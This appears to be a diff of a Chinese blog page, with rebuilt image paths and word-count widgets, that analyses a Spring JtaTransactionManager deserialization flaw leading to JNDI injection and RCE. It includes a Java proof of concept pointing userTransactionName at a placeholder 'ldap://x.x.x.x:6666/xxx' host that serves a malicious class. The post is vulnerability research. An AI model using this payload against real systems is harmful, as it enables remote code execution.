@@ -26,21 +26,21 @@
 <meta property="og:site_name" content="l3yx&#39;s blog">
 <meta property="og:description" content="该漏洞存在于spring-tx.jar包的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理，其重写了readObject方法，导致反序列化时该类时产生JNDI注入的问题从而RCE。但并不是spring最基本的包，默认不使用，所以并不是所有使用了sp">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png">
-<meta property="og:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png">
+<meta property="og:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png">
 <meta property="article:published_time" content="2020-04-14T02:14:16.000Z">
 <meta property="article:modified_time" content="2020-04-28T10:19:48.000Z">
 <meta property="article:author" content="淚笑">
 <meta property="article:tag" content="Java反序列化漏洞">
 <meta property="article:tag" content="Spring">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://l3yx.github.io/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png">
+<meta name="twitter:image" content="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png">
 
 
 <link rel="canonical" href="https://l3yx.github.io/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
@@ -230,6 +230,21 @@
     </span>
 
   
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>397</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
 </div>
 
         </div>
@@ -248,26 +263,38 @@
 
 
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>org.springframework.transaction.jta.JtaTransactionManager#readObject</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png" alt="image-20200414103005813"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103005813.png" class="" title="image-20200414103005813">
+
 <p>org.springframework.transaction.jta.JtaTransactionManager#initUserTransactionAndTransactionManager</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png" alt="image-20200414103027298"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103027298.png" class="" title="image-20200414103027298">
+
 <p>org.springframework.transaction.jta.JtaTransactionManager#lookupUserTransaction</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png" alt="image-20200414103115405"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103115405.png" class="" title="image-20200414103115405">
+
 <p>当前代码是IDEA反编译得来的，下载源码后，该方法介绍为</p>
 <blockquote>
 <p>Look up the JTA UserTransaction in JNDI via the configured name.</p>
 </blockquote>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png" alt="image-20200414103252512"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414103252512.png" class="" title="image-20200414103252512">
+
 <p>继续跟进也会发现其实就是封装了JNDI的操作</p>
 <p>org.springframework.jndi.JndiTemplate#lookup(java.lang.String)</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png" alt="image-20200414104000058"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104000058.png" class="" title="image-20200414104000058">
+
 <p>org.springframework.jndi.JndiTemplate#createInitialContext</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png" alt="image-20200414104026444"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414104026444.png" class="" title="image-20200414104026444">
+
+
+
 <p>而lookup的参数userTransactionName也是可控的，那么漏洞就很显然了</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先编译恶意类放于WEB服务中</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png" alt="image-20200414105118218"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105118218.png" class="" title="image-20200414105118218">
+
 <p>借助marshalsec启动ldap服务并设置恶意类地址</p>
-<p><img src="/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png" alt="image-20200414105225641"></p>
+<img src="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200414105225641.png" class="" title="image-20200414105225641">
+
+
+
 <p>最后模拟漏洞触发场景，构造恶意类并反序列化</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">&quot;ldap://x.x.x.x:6666/xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        unserialize(serialize(jtaTransactionManager));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -324,6 +351,20 @@
     </span>
     <span class="author" itemprop="copyrightHolder">淚笑</span>
   </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">78k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:43</span>
+  </span>
+</div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
